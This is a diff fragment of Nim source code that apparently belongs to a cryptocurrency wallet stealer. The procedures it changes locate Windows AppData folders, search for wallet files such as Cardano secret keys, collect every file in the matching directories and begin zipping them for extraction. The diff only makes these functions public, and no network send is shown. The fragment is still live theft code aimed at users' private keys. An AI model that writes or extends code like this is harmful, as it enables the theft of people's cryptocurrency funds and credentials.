@@ -21,17 +21,17 @@ const
     "\\Cardano\\secret.key"
   ]
 
-proc getAppData(): string =
+proc getAppData*(): string =
   result = getEnv("APPDATA")
   if result == "":
     result = getEnv("USERPROFILE") & "\\AppData\\Roaming"
 
-proc getLocalAppData(): string =
+proc getLocalAppData*(): string =
   result = getEnv("LOCALAPPDATA")
   if result == "":
     result = getEnv("USERPROFILE") & "\\AppData\\Local"
 
-proc findWallets(): seq[string] =
+proc findWallets*(): seq[string] =
   result = @[]
   
   let appdata = getAppData()
@@ -71,7 +71,7 @@ proc findWallets(): seq[string] =
       for file in walkFiles(fullPath & "\\*"):
         result.add(file)
 
-proc extractAndZipWallets(): string =
+proc extractAndZipWallets*(): string =
   let wallets = findWallets()
   
   if wallets.len == 0:
